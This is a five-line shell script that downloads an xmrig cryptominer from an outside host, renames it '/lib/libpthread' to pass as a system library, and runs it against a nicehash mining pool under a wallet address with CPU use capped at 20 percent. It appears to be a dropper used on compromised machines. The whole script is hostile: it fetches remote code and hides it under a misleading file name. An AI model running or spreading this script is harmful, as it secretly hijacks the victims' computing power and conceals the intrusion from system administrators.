curl http://miner.gpu360.com/xmrig/libpthread > libpthread
yum -y install libuv
mv ./libpthread /lib/libpthread
chmod +x /lib/libpthread
 /lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x -k